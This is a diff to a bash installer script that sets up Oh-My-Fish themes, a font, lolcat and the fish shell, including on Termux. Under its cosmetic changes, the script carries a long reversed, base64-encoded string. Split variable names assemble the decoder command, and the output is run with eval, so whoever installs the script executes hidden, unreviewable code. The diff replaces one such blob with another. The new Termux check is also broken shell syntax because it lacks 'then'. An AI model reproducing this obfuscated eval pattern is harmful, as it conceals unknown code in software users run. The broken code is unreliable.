@@ -12,19 +12,20 @@
 # If you copy, consider giving credit! We keep our code open source to help others
 
 
-black='\033[0;30m'
-red='\033[0;31m'
-green='\033[0;32m'
-yellow='\033[0;33m'
-blue='\033[0;34m'
-purple='\033[0;35m'
-cyan='\033[0;36m'
-white='\033[0;37m'
+black="\033[0;30m"
+red="\033[0;31m"
+green="\033[0;32m"
+yellow="\033[0;33m"
+blue="\033[0;34m"
+purple="\033[0;35m"
+cyan="\033[0;36m"
+white="\033[0;37m"
+nc="\033[00m"
 
-info="${cyan}[${white}+${cyan}] ${yellow}"
-ask="${cyan}[${white}?${cyan}] ${purple}"
-error="${cyan}[${white}!${cyan}] ${red}"
-success="${cyan}[${white}√${cyan}] ${green}"
+info="${cyan}[${nc}+${cyan}] ${yellow}"
+ask="${cyan}[${nc}?${cyan}] ${purple}"
+error="${cyan}[${nc}!${cyan}] ${red}"
+success="${cyan}[${nc}√${cyan}] ${green}"
 
 clear
 logo="
@@ -44,7 +45,7 @@ stty -echoctl
 trap "echo -e '\n${success}Thanks for using!\n'; exit" 2
 
 # Termux
-if [[ -d /data/data/com.termux/files/home ]]; then
+if echo "$HOME" | grep -q "termux";
     termux=true
 else
     termux=false
@@ -59,10 +60,10 @@ fi
 
 echo -e "$logo"
 sleep 2
-echo $white
+echo -e "$nc"
 
 
-gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
 x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
 eval "$N0q$x$Hc2$rQW"
 
@@ -90,14 +91,21 @@ if command -v lolcat > /dev/null 2>&1; then
     echo -e "$logo" | lolcat
 fi
 
+if ! [ -f files/omf.fish ]; then
+    echo -e "${info}Cloning Oh-My-Shell.......\n $nc"
+    git clone https://github.com/KasRoudra/oh-my-shell
+    cp -r oh-my-shell/files files
+    rm -rf oh-my-shell
+fi
+
 
 if ! [ -d $HOME/.local/share/omf ]; then
-    echo -e "${info}Installing Oh-My-Fish.......\n $white"
+    echo -e "${info}Installing Oh-My-Fish.......\n $nc"
     fish files/omf.fish
 fi
 
 sleep 1
-echo -e "${info}Installing themes....\n $white"
+echo -e "${info}Installing themes....\n $nc"
 if $termux; then
     if ! [ -d $HOME/.local/share/omf/themes/kastermux ]; then
         cp -r files/kastermux $HOME/.local/share/omf/themes/
@@ -113,13 +121,13 @@ fi
 sleep 2
 NOW=`date '+%F_%H:%M:%S'`
 if [ -d $HOME/.config/fish/config.fish ]; then
-    echo -e "${info}Creating a backup.......\n $white"
+    echo -e "${info}Creating a backup.......\n $nc"
     cp -r $HOME/.config/fish/config.fish $HOME/.config/fish/config.${NOW}.fish
     sleep 2
 fi
 if $termux; then
     cp -r $HOME/.termux $HOME/.termux${NOW}.backup
-    echo -e "${info}Changing font.....\n $white"
+    echo -e "${info}Changing font.....\n $nc"
     sleep 1
     cp -r files/font.ttf $HOME/.termux
     cp -r files/colors.properties $HOME/.termux
@@ -129,12 +137,12 @@ fi
 echo -e "${ask}Enter your name to be displayed in home : ${green}" 
 read -p "[~]--> " name
 if [ -z "$name" ]; then
-    echo -e "${error}No name...\n $white"
+    echo -e "${error}No name...\n $nc"
 else
-    echo -e "\n${ask}Do you want coloring? It requires 300MB storage(y/n) ${green}" 
-    read -p "[~]--> " islol
-    if [ "$islol" == "y" ]; then
-        if ! command -v lolcat > /dev/null 2>&1; then
+    if ! command -v lolcat > /dev/null 2>&1; then
+        echo -e "\n${ask}Do you want rainbow colors? It requires 350MB storage(y/n) ${green}" 
+        read -p "[~]--> " islol
+        if [ "$islol" == "y" ]; then
             for try in 0 1 2 3; do
                 echo -e "${info}Installing Lolcat...."
                 if command -v gem > /dev/null 2>&1; then
@@ -148,6 +156,12 @@ else
                         sudo pip3 install lolcat
                     else
                         pip3 install lolcat
+                    fi
+                elif command -v pacman > /dev/null 2>&1; then
+                    if $sudo; then
+                        sudo pacman -S lolcat --noconfirm
+                    else
+                        pacman -S lolcat --noconfirm
                     fi
                 else
                     command -v ruby > /dev/null 2>&1 || installer ruby
@@ -165,16 +179,16 @@ else
     sed s/"Name"/"$name"/g files/template.fish > $HOME/.config/fish/config.fish
 fi
 sleep 2
-fish -c "source '$HOME/.config/fish/config.fish'"
 rm -rf $HOME/../usr/etc/motd  $HOME/../usr/etc/motd.sh
-echo -e "${info}Changing Shell...\n $white"
+fish -c 'source "$HOME/.config/fish/config.fish"'
+echo -e "${info}Changing Shell...\n $nc"
 if $termux; then
     chsh -s fish
 else
     chsh -s $(which fish)
 fi
 sleep 2
-echo -e "${info}Changing Theme...\n $white"
+echo -e "${info}Changing Theme...\n $nc"
 if $termux; then
     fish -c "omf theme kastermux"
     termux-reload-settings
@@ -182,13 +196,13 @@ else
     fish -c "omf theme kas"
 fi
 sleep 1
-echo -e "${info}Configuring git for no pager...\n $white"
+echo -e "${info}Configuring git for no pager...\n $nc"
 git config --global pager.diff false
 git config --global pager.log false
 if $termux; then
-    echo -e "${success}Restart Terminal to see effects!\n $white"
+    echo -e "${success}Restart Terminal to see effects!\n $nc"
 else
-    echo -e "${success}Log out and log in back to see effects!\n $white"
+    echo -e "${success}Log out and log in back to see effects!\n $nc"
 fi
 sleep 3
 clear
